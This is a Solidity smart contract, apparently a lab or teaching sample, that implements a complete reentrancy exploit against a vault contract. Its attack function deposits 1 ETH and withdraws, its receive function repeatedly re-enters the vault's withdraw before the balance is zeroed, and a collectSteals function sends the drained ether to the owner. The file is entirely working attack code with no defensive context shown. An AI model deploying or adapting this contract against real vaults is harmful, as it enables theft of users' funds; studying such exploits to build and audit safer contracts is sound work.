// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract AttackReentrancy {
    IVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    // called automatically every time this contract receives ETH
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(); // re-enter before balances[attacker] = 0
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send 1 ETH");
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    function collectSteals() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}